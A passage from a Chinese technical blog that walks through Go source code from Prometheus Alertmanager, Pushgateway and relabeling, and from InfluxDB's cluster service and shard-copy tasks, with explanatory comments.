return ctx, nil, fmt.Errorf(\"stage for receiver missing\") &#125; return s.Exec(ctx, alerts...)&#125; 12345678910111213141516171819202122232425// Exec attempts to execute all stages concurrently and discards the results.// It returns its input alerts and a types.MultiError if one or more stages fail.func (fs FanoutStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) &#123; var ( wg sync.WaitGroup me types.MultiError ) wg.Add(len(fs)) for _, s := range fs &#123; go func(s Stage) &#123; if _, _, err := s.Exec(ctx, alerts...); err != nil &#123; me.Add(err) log.Errorf(\"Error on notify: %s\", err) &#125; wg.Done() &#125;(s) &#125; wg.Wait() if me.Len() &gt; 0 &#123; return ctx, alerts, &amp;me &#125; return ctx, alerts, nil&#125; 123456789101112131415// Exec implements the Stage interface.func (ms MultiStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) &#123; var err error for _, s := range ms &#123; if len(alerts) == 0 &#123; return ctx, nil, nil &#125; ctx, alerts, err = s.Exec(ctx, alerts...) if err != nil &#123; return ctx, nil, err &#125; &#125; return ctx, alerts, nil&#125; 告警抑制的配置，inhibit_rules配置项目： 1234567891011121314151617// Exec implements the Stage interface.func (n *InhibitStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) &#123; var filtered []*types.Alert for _, a := range alerts &#123; _, ok := n.marker.Inhibited(a.Fingerprint()) // TODO(fabxc): increment total alerts counter. // Do not send the alert if the silencer mutes it. if !n.muter.Mutes(a.Labels) &#123; // TODO(fabxc): increment muted alerts counter. filtered = append(filtered, a) // Store whether a previously inhibited alert is firing again. a.WasInhibited = ok &#125; &#125; return ctx, filtered, nil&#125; 告警静音： 1234567891011121314151617181920212223242526272829303132// Exec implements the Stage interface.func (n *SilenceStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) &#123; var filtered []*types.Alert for _, a := range alerts &#123; _, ok := n.marker.Silenced(a.Fingerprint()) // TODO(fabxc): increment total alerts counter. // Do not send the alert if the silencer mutes it. sils, err := n.silences.Query( silence.QState(silence.StateActive), silence.QMatches(a.Labels), ) if err != nil &#123; log.Errorf(\"Querying silences failed: %s\", err) &#125; if len(sils) == 0 &#123; // TODO(fabxc): increment muted alerts counter. filtered = append(filtered, a) n.marker.SetSilenced(a.Labels.Fingerprint()) // Store whether a previously silenced alert is firing again. a.WasSilenced = ok &#125; else &#123; ids := make([]string, len(sils)) for i, s := range sils &#123; ids[i] = s.Id &#125; n.marker.SetSilenced(a.Labels.Fingerprint(), ids...) &#125; &#125; return ctx, filtered, nil&#125; Pushgatewaypushgateway主要作用是允许临时任务和批作业向prometheus公开指标数据。主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这次 jobs 可以直接向 Prometheus server 端推送它们的 metrics。这种方式主要用于服务层面的 metrics，对于机器层面的 metrices，需要使用 node exporter。 push gateway的代码逻辑都再main函数里面： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126func main() &#123; var ( app = kingpin.New(filepath.Base(os.Args[0]), \"The Pushgateway\") listenAddress = app.Flag(\"web.listen-address\", \"Address to listen on for the web interface, API, and telemetry.\").Default(\":9091\").String() metricsPath = app.Flag(\"web.telemetry-path\", \"Path under which to expose metrics.\").Default(\"/metrics\").String() externalURL = app.Flag(\"web.external-url\", \"The URL under which the Pushgateway is externally reachable.\").Default(\"\").URL() routePrefix = app.Flag(\"web.route-prefix\", \"Prefix for the internal routes of web endpoints. Defaults to the path of --web.external-url.\").Default(\"\").String() enableLifeCycle = app.Flag(\"web.enable-lifecycle\", \"Enable shutdown via HTTP request.\").Default(\"false\").Bool() enableAdminAPI = app.Flag(\"web.enable-admin-api\", \"Enable API endpoints for admin control actions.\").Default(\"false\").Bool() persistenceFile = app.Flag(\"persistence.file\", \"File to persist metrics. If empty, metrics are only kept in memory.\").Default(\"\").String() persistenceInterval = app.Flag(\"persistence.interval\", \"The minimum interval at which to write out the persistence file.\").Default(\"5m\").Duration() promlogConfig = promlog.Config&#123;&#125; ) promlogflag.AddFlags(app, &amp;promlogConfig) app.Version(version.Print(\"pushgateway\")) app.HelpFlag.Short('h') kingpin.MustParse(app.Parse(os.Args[1:])) logger := promlog.New(&amp;promlogConfig) *routePrefix = computeRoutePrefix(*routePrefix, *externalURL) externalPathPrefix := computeRoutePrefix(\"\", *externalURL) level.Info(logger).Log(\"msg\", \"starting pushgateway\", \"version\", version.Info()) level.Info(logger).Log(\"build_context\", version.BuildContext()) level.Debug(logger).Log(\"msg\", \"external URL\", \"url\", *externalURL) level.Debug(logger).Log(\"msg\", \"path prefix used externally\", \"path\", externalPathPrefix) level.Debug(logger).Log(\"msg\", \"path prefix for internal routing\", \"path\", *routePrefix) // flags is used to show command line flags on the status page. // Kingpin default flags are excluded as they would be confusing. flags := map[string]string&#123;&#125; boilerplateFlags := kingpin.New(\"\", \"\").Version(\"\") for _, f := range app.Model().Flags &#123; if boilerplateFlags.GetFlag(f.Name) == nil &#123; flags[f.Name] = f.Value.String() &#125; &#125; ms := storage.NewDiskMetricStore(*persistenceFile, *persistenceInterval, prometheus.DefaultGatherer, logger) // Create a Gatherer combining the DefaultGatherer and the metrics from the metric store. g := prometheus.Gatherers&#123; prometheus.DefaultGatherer, prometheus.GathererFunc(func() ([]*dto.MetricFamily, error) &#123; return ms.GetMetricFamilies(), nil &#125;), &#125; r := httprouter.New() r.Handler(\"GET\", *routePrefix+\"/-/healthy\", handler.Healthy(ms)) r.Handler(\"GET\", *routePrefix+\"/-/ready\", handler.Ready(ms)) r.Handler( \"GET\", path.Join(*routePrefix, *metricsPath), promhttp.HandlerFor(g, promhttp.HandlerOpts&#123; ErrorLog: logFunc(level.Error(logger).Log), &#125;), ) if *enableAdminAPI &#123; // To be consistent with Prometheus codebase and provide endpoint versioning, we use the same path // as Prometheus for its admin endpoints, even if this may feel excesive for just one simple endpoint // this will likely change over time. r.Handler(\"PUT\", *routePrefix+\"/api/v1/admin/wipe\", handler.WipeMetricStore(ms, logger)) &#125; // Handlers for pushing and deleting metrics. pushAPIPath := *routePrefix + \"/metrics\" for _, suffix := range []string&#123;\"\", handler.Base64Suffix&#125; &#123; jobBase64Encoded := suffix == handler.Base64Suffix r.PUT(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Push(ms, true, jobBase64Encoded, logger)) r.POST(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Push(ms, false, jobBase64Encoded, logger)) r.DELETE(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Delete(ms, jobBase64Encoded, logger)) r.PUT(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Push(ms, true, jobBase64Encoded, logger)) r.POST(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Push(ms, false, jobBase64Encoded, logger)) r.DELETE(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Delete(ms, jobBase64Encoded, logger)) &#125; r.Handler(\"GET\", *routePrefix+\"/static/*filepath\", handler.Static(asset.Assets, *routePrefix)) statusHandler := handler.Status(ms, asset.Assets, flags, externalPathPrefix, logger) r.Handler(\"GET\", *routePrefix+\"/status\", statusHandler) r.Handler(\"GET\", *routePrefix+\"/\", statusHandler) // Re-enable pprof. r.GET(*routePrefix+\"/debug/pprof/*pprof\", handlePprof) level.Info(logger).Log(\"listen_address\", *listenAddress) l, err := net.Listen(\"tcp\", *listenAddress) if err != nil &#123; level.Error(logger).Log(\"err\", err) os.Exit(1) &#125; quitCh := make(chan struct&#123;&#125;) quitHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, \"Requesting termination... Goodbye!\") close(quitCh) &#125;) forbiddenAPINotEnabled := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) &#123; w.WriteHeader(http.StatusForbidden) w.Write([]byte(\"Lifecycle API is not enabled.\")) &#125;) if *enableLifeCycle &#123; r.Handler(\"PUT\", *routePrefix+\"/-/quit\", quitHandler) r.Handler(\"POST\", *routePrefix+\"/-/quit\", quitHandler) &#125; else &#123; r.Handler(\"PUT\", *routePrefix+\"/-/quit\", forbiddenAPINotEnabled) r.Handler(\"POST\", *routePrefix+\"/-/quit\", forbiddenAPINotEnabled) &#125; r.Handler(\"GET\", \"/-/quit\", http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) &#123; w.WriteHeader(http.StatusMethodNotAllowed) w.Write([]byte(\"Only POST or PUT requests allowed.\")) &#125;)) go closeListenerOnQuit(l, quitCh, logger) err = (&amp;http.Server&#123;Addr: *listenAddress, Handler: r&#125;).Serve(l) level.Error(logger).Log(\"msg\", \"HTTP server stopped\", \"err\", err) // To give running connections a chance to submit their payload, we wait // for 1sec, but we don't want to wait long (e.g. until all connections // are done) to not delay the shutdown. time.Sleep(time.Second) if err := ms.Shutdown(); err != nil &#123; level.Error(logger).Log(\"msg\", \"problem shutting down metric storage\", \"err\", err) &#125;&#125; 通过push到接口metric传递数据到prometheus，push接口调用push函数去使用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110// Push returns an http.Handler which accepts samples over HTTP and stores them// in the MetricStore. If replace is true, all metrics for the job and instance// given by the request are deleted before new ones are stored.//// The returned handler is already instrumented for Prometheus.func Push( ms storage.MetricStore, replace bool, jobBase64Encoded bool, logger log.Logger,) func(http.ResponseWriter, *http.Request, httprouter.Params) &#123; var ps httprouter.Params var mtx sync.Mutex // Protects ps. handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) &#123; job := ps.ByName(\"job\") if jobBase64Encoded &#123; var err error if job, err = decodeBase64(job); err != nil &#123; http.Error(w, fmt.Sprintf(\"invalid base64 encoding in job name %q: %v\", ps.ByName(\"job\"), err), http.StatusBadRequest) level.Debug(logger).Log(\"msg\", \"invalid base64 encoding in job name\", \"job\", ps.ByName(\"job\"), \"err\", err.Error()) return &#125; &#125; labelsString := ps.ByName(\"labels\") mtx.Unlock() labels, err := splitLabels(labelsString) if err != nil &#123; http.Error(w, err.Error(), http.StatusBadRequest) level.Debug(logger).Log(\"msg\", \"failed to parse URL\", \"url\", labelsString, \"err\", err.Error()) return &#125; if job == \"\" &#123; http.Error(w, \"job name is required\", http.StatusBadRequest) level.Debug(logger).Log(\"msg\", \"job name is required\") return &#125; labels[\"job\"] = job var metricFamilies map[string]*dto.MetricFamily ctMediatype, ctParams, ctErr := mime.ParseMediaType(r.Header.Get(\"Content-Type\")) if ctErr == nil &amp;&amp; ctMediatype == \"application/vnd.google.protobuf\" &amp;&amp; ctParams[\"encoding\"] == \"delimited\" &amp;&amp; ctParams[\"proto\"] == \"io.prometheus.client.MetricFamily\" &#123; metricFamilies = map[string]*dto.MetricFamily&#123;&#125; for &#123; mf := &amp;dto.MetricFamily&#123;&#125; if _, err = pbutil.ReadDelimited(r.Body, mf); err != nil &#123; if err == io.EOF &#123; err = nil &#125; break &#125; metricFamilies[mf.GetName()] = mf &#125; &#125; else &#123; // We could do further content-type checks here, but the // fallback for now will anyway be the text format // version 0.0.4, so just go for it and see if it works. var parser expfmt.TextParser metricFamilies, err = parser.TextToMetricFamilies(r.Body) &#125; if err != nil &#123; http.Error(w, err.Error(), http.StatusBadRequest) level.Debug(logger).Log(\"msg\", \"failed to parse text\", \"err\", err.Error()) return &#125; now := time.Now() errCh := make(chan error, 1) errReceived := false ms.SubmitWriteRequest(storage.WriteRequest&#123; Labels: labels, Timestamp: now, MetricFamilies: metricFamilies, Replace: replace, Done: errCh, &#125;) for err := range errCh &#123; // Send only first error via HTTP, but log all of them. // TODO(beorn): Consider sending all errors once we // have a use case. (Currently, at most one error is // produced.) if !errReceived &#123; http.Error( w, fmt.Sprintf(\"pushed metrics are invalid or inconsistent with existing metrics: %v\", err), http.StatusBadRequest, ) &#125; level.Error(logger).Log( \"msg\", \"pushed metrics are invalid or inconsistent with existing metrics\", \"method\", r.Method, \"source\", r.RemoteAddr, \"err\", err.Error(), ) errReceived = true &#125; &#125;) instrumentedHandler := promhttp.InstrumentHandlerRequestSize( httpPushSize, promhttp.InstrumentHandlerDuration( httpPushDuration, promhttp.InstrumentHandlerCounter( httpCnt.MustCurryWith(prometheus.Labels&#123;\"handler\": \"push\"&#125;), handler, ))) return func(w http.ResponseWriter, r *http.Request, params httprouter.Params) &#123; mtx.Lock() ps = params instrumentedHandler.ServeHTTP(w, r) &#125;&#125; 数据push完会放入pushgateway的缓存队列中存储，prometheus通过配置，采用pull的方式拉取数据获取指标。 relabelrelabel功能主要是用于实现多数据中心的监控数据聚合。Relabel可以在Prometheus采集数据之前，通过Target实例的Metadata信息，动态重新写入Label的值。relabel可以对Target实例进行过滤和选择。 relabel实现过程： 12345678910111213// Process returns a relabeled copy of the given label set. The relabel configurations// are applied in order of input.// If a label set is dropped, nil is returned.// May return the input labelSet modified.func Process(labels model.LabelSet, cfgs ...*config.RelabelConfig) model.LabelSet &#123; for _, cfg := range cfgs &#123; labels = relabel(labels, cfg) if labels == nil &#123; return nil &#125; &#125; return labels&#125; 调用process函数来处理，针对每个配置进行relabel操作。 relabel函数实现，relabel的类型有：RelabelDrop， RelabelKeep，RelabelReplace，RelabelLabelMap，RelabelLabelDrop，RelabelLabelKeep，RelabelHashMod 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566func relabel(labels model.LabelSet, cfg *config.RelabelConfig) model.LabelSet &#123; values := make([]string, 0, len(cfg.SourceLabels)) for _, ln := range cfg.SourceLabels &#123; values = append(values, string(labels[ln])) &#125; val := strings.Join(values, cfg.Separator) switch cfg.Action &#123; case config.RelabelDrop: if cfg.Regex.MatchString(val) &#123; return nil &#125; case config.RelabelKeep: if !cfg.Regex.MatchString(val) &#123; return nil &#125; case config.RelabelReplace: indexes := cfg.Regex.FindStringSubmatchIndex(val) // If there is no match no replacement must take place. if indexes == nil &#123; break &#125; target := model.LabelName(cfg.Regex.ExpandString([]byte&#123;&#125;, cfg.TargetLabel, val, indexes)) if !target.IsValid() &#123; delete(labels, model.LabelName(cfg.TargetLabel)) break &#125; res := cfg.Regex.ExpandString([]byte&#123;&#125;, cfg.Replacement, val, indexes) if len(res) == 0 &#123; delete(labels, model.LabelName(cfg.TargetLabel)) break &#125; labels[target] = model.LabelValue(res) case config.RelabelHashMod: mod := sum64(md5.Sum([]byte(val))) % cfg.Modulus labels[model.LabelName(cfg.TargetLabel)] = model.LabelValue(fmt.Sprintf(\"%d\", mod)) case config.RelabelLabelMap: out := make(model.LabelSet, len(labels)) // Take a copy to avoid infinite loops. for ln, lv := range labels &#123; out[ln] = lv &#125; for ln, lv := range labels &#123; if cfg.Regex.MatchString(string(ln)) &#123; res := cfg.Regex.ReplaceAllString(string(ln), cfg.Replacement) out[model.LabelName(res)] = lv &#125; &#125; labels = out case config.RelabelLabelDrop: for ln := range labels &#123; if cfg.Regex.MatchString(string(ln)) &#123; delete(labels, ln) &#125; &#125; case config.RelabelLabelKeep: for ln := range labels &#123; if !cfg.Regex.MatchString(string(ln)) &#123; delete(labels, ln) &#125; &#125; default: panic(fmt.Errorf(\"retrieval.relabel: unknown relabel action type %q\", cfg.Action)) &#125; return labels&#125; action=keep, 丢弃指定源标签的标签值没有匹配到regex的target action=drop，丢弃指定源标签的标签值匹配到regex的target action=labeldrop，丢弃匹配到regex 的标签 action=labelkeep，丢弃没有匹配到regex 的标签 action=replace，更改标签名、更改标签值、合并标签 action=hashmod，将多个源标签的值进行hash，作为target标签的值 action=labelmap，Regex匹配名-&gt;replacement用原标签名的部分来替换名 replace是缺省action，可以不配置action 参考资料https://www.jianshu.com/p/c21d399c140a https://blog.csdn.net/luanpeng825485697/article/details/82318204","categories":[{"name":"prometheus","slug":"prometheus","permalink":"http://www.yorzorzy.xyz/categories/prometheus/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"influxdb集群代码分析","slug":"influxdb 集群代码分析","date":"2020-02-17T03:14:59.099Z","updated":"2020-02-17T03:13:55.000Z","comments":true,"path":"2020/02/17/influxdb 集群代码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/02/17/influxdb%20%E9%9B%86%E7%BE%A4%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"influxdb集群代码分析本文主要分析下influxdb中cluster部分的代码： 入口函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091func (s *Server) OpenDataServer() error &#123; if s.TSDBStore != nil &amp;&amp; !s.DataServicesOpened &#123; s.DataServicesOpened = true // Append services. s.appendClusterService(s.config.Cluster) // 增加集群服务注册 s.appendMonitorService() s.appendPrecreatorService(s.config.Precreator) s.appendSnapshotterService() s.appendContinuousQueryService(s.config.ContinuousQuery) s.appendAntiEntropyService(s.config.AntiEntropy) s.appendHTTPDService(s.config.HTTPD) s.appendStorageService(s.config.Storage) s.appendRetentionPolicyService(s.config.Retention) for _, i := range s.config.GraphiteInputs &#123; if err := s.appendGraphiteService(i); err != nil &#123; return err &#125; &#125; for _, i := range s.config.CollectdInputs &#123; s.appendCollectdService(i) &#125; for _, i := range s.config.OpenTSDBInputs &#123; if err := s.appendOpenTSDBService(i); err != nil &#123; return err &#125; &#125; for _, i := range s.config.UDPInputs &#123; s.appendUDPService(i) &#125; s.Subscriber.MetaClient = s.MetaClient s.PointsWriter.MetaClient = s.MetaClient s.Monitor.MetaClient = s.MetaClient s.ShardWriter.MetaClient = s.MetaClient s.HintedHandoff.MetaClient = s.MetaClient s.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader) s.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader) // Configure logging for all services and clients. if s.config.Meta.LoggingEnabled &#123; s.MetaClient.WithLogger(s.Logger) &#125; s.TSDBStore.WithLogger(s.Logger) if s.config.Data.QueryLogEnabled &#123; s.QueryExecutor.WithLogger(s.Logger) &#125; s.PointsWriter.WithLogger(s.Logger) s.Subscriber.WithLogger(s.Logger) s.HintedHandoff.WithLogger(s.Logger) for _, svc := range s.Services &#123; svc.WithLogger(s.Logger) &#125; s.SnapshotterService.WithLogger(s.Logger) s.Monitor.WithLogger(s.Logger) // Open TSDB store. if err := s.TSDBStore.Open(); err != nil &#123; return fmt.Errorf(\"open tsdb store: %s\", err) &#125; // Open the hinted handoff service if err := s.HintedHandoff.Open(); err != nil &#123; return fmt.Errorf(\"open hinted handoff: %s\", err) &#125; // Open the subscriber service if err := s.Subscriber.Open(); err != nil &#123; return fmt.Errorf(\"open subscriber: %s\", err) &#125; // Open the points writer service if err := s.PointsWriter.Open(); err != nil &#123; return fmt.Errorf(\"open points writer: %s\", err) &#125; s.PointsWriter.AddWriteSubscriber(s.Subscriber.Points()) for _, service := range s.Services &#123; if err := service.Open(); err != nil &#123; //集群服务启动 return fmt.Errorf(\"open service: %s\", err) &#125; &#125; return nil &#125; if s.TSDBStore == nil &#123; return fmt.Errorf(\"Data server is not enabled\") &#125; return nil&#125; 启动集群服务代码： 12345678910111213// Open opens the network listener and begins serving requests.func (s *Service) Open() error &#123; s.Logger.Info(\"Starting cluster service\") // Begin serving conections. s.wg.Add(1) go s.serve() //启动服务 s.CopyShardTaskManager.Logger = s.Logger go s.CopyShardTaskManager.WaitForTask() //等待task任务 return nil&#125; serve函数： 12345678910111213141516171819202122232425262728293031// serve accepts connections from the listener and handles them.func (s *Service) serve() &#123; defer s.wg.Done() for &#123; // Check if the service is shutting down. select &#123; case &lt;-s.closing: return default: &#125; // Accept the next connection. conn, err := s.Listener.Accept() //监听连接请求 if err != nil &#123; if strings.Contains(err.Error(), \"connection closed\") &#123; s.Logger.Info(\"cluster service accept error\", zap.Error(err)) return &#125; s.Logger.Info(\"accept error\", zap.Error(err)) continue &#125; // Delegate connection handling to a separate goroutine. s.wg.Add(1) go func() &#123; defer s.wg.Done() s.handleConn(conn) //主要处理函数 &#125;() &#125;&#125; handleConn函数启动： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// handleConn services an individual TCP connection.func (s *Service) handleConn(conn net.Conn) &#123; // Ensure connection is closed when service is closed. closing := make(chan struct&#123;&#125;) defer close(closing) go func() &#123; select &#123; case &lt;-closing: case &lt;-s.closing: &#125; conn.Close() &#125;() s.Logger.Info(\"accept remote connection\", zap.String(\"remoteaddr\", conn.RemoteAddr().String())) defer func() &#123; s.Logger.Info(\"close remote connection\", zap.String(\"remoteaddr\", conn.RemoteAddr().String())) &#125;() for &#123; // Read type-length-value. typ, err := ReadType(conn) //读取连接的数据类型 if err != nil &#123; if strings.HasSuffix(err.Error(), \"EOF\") &#123; return &#125; s.Logger.Info(\"unable to read type\", zap.Error(err)) return &#125; // Delegate message processing by type. //处理不同数据类型 switch typ &#123; case writeShardRequestMessage: buf, err := ReadLV(conn) if err != nil &#123; s.Logger.Error(\"unable to read length-value\", zap.Error(err)) return &#125; //处理写shared请求 atomic.AddInt64(&amp;s.stats.WriteShardReq, 1) err = s.processWriteShardRequest(buf) if err != nil &#123; s.Logger.Info(\"process write shard error\", zap.Error(err)) &#125; //处理写请求返回 s.writeShardResponse(conn, err) case executeStatementRequestMessage: buf, err := ReadLV(conn) // ReadLV reads the length-value from a TLV record. if err != nil &#123; s.Logger.Info(\"unable to read length-value\", zap.Error(err)) return &#125; //处理执行 err = s.processExecuteStatementRequest(buf) if err != nil &#123; s.Logger.Info(\"process execute statement error\", zap.Error(err)) &#125; s.writeShardResponse(conn, err) case createIteratorRequestMessage: atomic.AddInt64(&amp;s.stats.CreateIteratorReq, 1) s.processCreateIteratorRequest(conn) //创建请求的interator return case fieldDimensionsRequestMessage: atomic.AddInt64(&amp;s.stats.FieldDimensionsReq, 1) s.processFieldDimensionsRequest(conn) return case createIteratorCostRequestMessage: s.processCreateIteratorCostRequest(conn) return case mapTypeRequestMessage: s.processMapTypeRequest(conn) return case seriesKeysRequestMessage: //s.statMap.Add(seriesKeysReq, 1) //atomic.AddInt64(&amp;s.stats.FieldDimensionsReq, 1) //s.processSeriesKeysRequest(conn) return case copyShardRequestMessage: s.processCopyShardRequest(conn) //处理copy shared分片请求 return default: s.Logger.Info(\"cluster service message type not found\", zap.Binary(\"type\", []byte&#123;typ&#125;)) &#125; &#125;&#125; processWriteShardRequest函数处理请求写操作，将数据写入shared分片中。 12345678910111213141516171819202122232425262728293031323334353637383940414243func (s *Service) processWriteShardRequest(buf []byte) error &#123; // Build request var req WriteShardRequest if err := req.UnmarshalBinary(buf); err != nil &#123; return err &#125; points := req.Points() atomic.AddInt64(&amp;s.stats.WriteShardPointsReq, int64(len(points))) err := s.TSDBStore.WriteToShard(req.ShardID(), points) // We may have received a write for a shard that we don't have locally because the // sending node may have just created the shard (via the metastore) and the write // arrived before the local store could create the shard. In this case, we need // to check the metastore to determine what database and retention policy this // shard should reside within. if err == tsdb.ErrShardNotFound &#123; db, rp := req.Database(), req.RetentionPolicy() if db == \"\" || rp == \"\" &#123; s.Logger.Info(\"drop write request. no database or rentention policy received\", logger.Shard(req.ShardID())) return nil &#125; err = s.TSDBStore.CreateShard(req.Database(), req.RetentionPolicy(), req.ShardID(), true) if err != nil &#123; atomic.AddInt64(&amp;s.stats.WriteShardFail, 1) return fmt.Errorf(\"create shard %d: %s\", req.ShardID(), err) &#125; err = s.TSDBStore.WriteToShard(req.ShardID(), points) if err != nil &#123; atomic.AddInt64(&amp;s.stats.WriteShardFail, 1) return fmt.Errorf(\"write shard %d: %s\", req.ShardID(), err) &#125; &#125; if err != nil &#123; atomic.AddInt64(&amp;s.stats.WriteShardFail, 1) return fmt.Errorf(\"write shard %d: %s\", req.ShardID(), err) &#125; return nil&#125; 解析statements请求操作，并执行statement语句： 123456789101112131415func (s *Service) processExecuteStatementRequest(buf []byte) error &#123; // Unmarshal the request. var req ExecuteStatementRequest if err := req.UnmarshalBinary(buf); err != nil &#123; return err &#125; // Parse the InfluxQL statement. stmt, err := influxql.ParseStatement(req.Statement()) if err != nil &#123; return err &#125; //处理不同的删除操作 return s.executeStatement(stmt, req.Database())&#125; WaitForTask用于同步influxdb节点之间数据 1234567891011121314151617181920func (t *CopyShardTaskManager) WaitForTask() &#123; for &#123; if t.Host == \"\" &#123; dataNodes, _ := t.MetaClient.DataNodes() //获取所有的数据节点 for _, nodeInfo := range dataNodes &#123; if nodeInfo.ID == t.Node.GetDataID() &#123; t.Host = nodeInfo.TCPHost &#125; &#125; &#125; copyShards := t.MetaClient.CopyShardStatus() //拷贝需要的shared分片 task := t.findTask(&amp;copyShards) //寻找task任务 if task != nil &#123; t.addRuningTask(task) go task.Run() //运行同步数据 &#125; time.Sleep(t.IdleSleepSeconds) &#125;&#125; Run函数运行，task任务执行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445func (tk *CopyShardTask) Run() &#123; defer tk.TaskManager.removeRuningTask(tk) //销毁正在运行的任务 err := tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardCopying) //更新状态 if err != nil &#123; tk.Logger.Warn(\"update copy shard status to copying failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; //同步数据更新函数 err = tk.doTask() if err != nil &#123; tk.Logger.Warn(\"do copy shard failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) //更新copy shared的状态，如果失败，则任务数据同步失败 err = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardFailed) if err != nil &#123; tk.Logger.Warn(\"update copy shard status to 'failed' failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) &#125; return &#125; //更新copyshared状态 err = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardSuccess) if err != nil &#123; tk.Logger.Warn(\"update copy shard status to success failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; tk.Logger.Info(\"update copy shard status to success\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID)) return&#125; doTask函数执行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113func (tk *CopyShardTask) doTask() (err error) &#123; nodeIDs := make([]uint64, 1) nodeIDs[0] = tk.SrcNodeID conn, err := tk.Dialer.DialNode(nodeIDs) //获取连接 if err != nil &#123; tk.Logger.Warn(\"dial failed to copy shard\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; defer conn.Close() // Write request. if err = EncodeTLV(conn, copyShardRequestMessage, &amp;CopyShardRequest&#123; ShardID: tk.ShardID, //编码写请求 &#125;); err != nil &#123; tk.Logger.Warn(\"copy shard request failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; // Read the response. var resp CopyShardResponse if _, err = DecodeTLV(conn, &amp;resp); err != nil &#123; tk.Logger.Warn(\"copy shard response failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; tk.TotalSize = resp.TotalSize if storeSD := tk.TaskManager.TSDBStore.Shard(tk.ShardID); storeSD == nil &#123; database, policy, _ := tk.TaskManager.MetaClient.ShardOwner(tk.ShardID) if err = tk.TaskManager.TSDBStore.CreateShard(database, policy, tk.ShardID, false); err != nil &#123; //创建分片 tk.Logger.Warn(\"create shard failed\", zap.String(\"database\", database), zap.String(\"policy\", policy), zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; &#125; else if _, err = os.Stat(storeSD.Path()); os.IsNotExist(err) &#123; if err = tk.TaskManager.TSDBStore.DeleteShard(tk.ShardID); err != nil &#123; tk.Logger.Warn(\"delete shard failed\", zap.String(\"database\", storeSD.Database()), zap.String(\"policy\", storeSD.RetentionPolicy()), zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; if err = tk.TaskManager.TSDBStore.CreateShard(storeSD.Database(), storeSD.RetentionPolicy(), tk.ShardID, false); err != nil &#123; tk.Logger.Warn(\"create shard failed\", zap.String(\"database\", storeSD.Database()), zap.String(\"policy\", storeSD.RetentionPolicy()), zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; &#125; //新建连接wrapper connWrapper := NewConnReaderWrapper(conn, tk) //恢复shared if err = tk.TaskManager.TSDBStore.RestoreShard(tk.ShardID, connWrapper); err != nil &#123; tk.Logger.Warn(\"restore shard failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; //conn io.Reader never get io.EOF err while RestoreShard, update here //更新copyshared处理，更新数据的主要过程 err = tk.TaskManager.MetaClient.UpdateCopyShardProgress(tk.ID, tk.TotalSize, connWrapper.TotalReceived) if err != nil &#123; tk.Logger.Warn(\"copy shard process update failed:\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Uint64(\"total\", tk.TotalSize), zap.Uint64(\"totalReceived\", connWrapper.TotalReceived), zap.Error(err)) 